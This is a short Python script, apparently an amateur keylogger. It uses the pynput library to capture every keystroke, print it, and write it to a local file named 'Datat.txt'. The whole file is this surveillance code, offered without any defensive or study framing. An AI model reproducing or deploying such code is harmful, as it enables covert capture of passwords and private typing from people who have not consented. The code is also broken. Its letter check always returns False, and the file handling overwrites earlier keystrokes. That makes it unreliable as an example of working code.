import os
import sys
from pynput import keyboard
from pynput.keyboard import Listener

# define 'write' for when key is released
def write(key):

    # define value that stores strokes
    keydata = str(key)

    # With file open with reading and writing permissions write and close the 'keydata' as sting characters
    with open('Datat.txt', 'r+') as file:
        # if keydata does not me earlier criteria then keydata is written.
        file.write(keydata)
        file.close()

#testing testing

# defines letters
def is_letter(value):
    # universal variables for alphabet letters
    alphabet = 'abcdefghijklmnopqrstuvwxyz'

    # iterates through alphabet to compare 'value' and returns either True or False
    for letter in alphabet:
        if value == alphabet:
            return True

        else:
            return False


# function when key is pressed uses the "is_letter" function to compare characters
def on_press(key):
    if is_letter(key) == True:
        print("{0}".format(key.char))

    if is_letter(key) == False:
            print("{0}".format(key))


# Using Listener, everytime on_press is activated function write activates
# This also joins the characters
with Listener(on_press=on_press, on_release=write) as listener:
    listener.join()

